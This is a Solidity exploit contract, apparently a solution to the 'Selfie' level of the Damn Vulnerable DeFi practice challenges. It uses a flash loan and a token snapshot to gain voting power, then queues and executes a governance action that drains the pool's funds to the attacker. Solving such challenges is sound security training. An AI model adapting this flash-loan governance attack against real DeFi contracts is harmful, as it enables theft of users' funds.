// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256) external;

    function drainAllFunds(address) external;
}

interface IGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract SelfieExploit {
    ISelfiePool pool;
    IGovernance gov;
    DamnValuableTokenSnapshot token;

    uint256 actionId;

    address attacker;

    constructor(address selfiePool, address governance, address tokenAddr) {
        pool = ISelfiePool(selfiePool);
        gov = IGovernance(governance);
        token = DamnValuableTokenSnapshot(tokenAddr);
        attacker = msg.sender;
    }

    function prepare() public {

        uint256 amount = token.balanceOf(address(pool));

        pool.flashLoan(amount);
    }

    function receiveTokens(address, uint256 amount) public {

        token.snapshot();

        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );

        token.transfer(msg.sender, amount);
    }

    function exploit() public {
        gov.executeAction(actionId);
    }
}
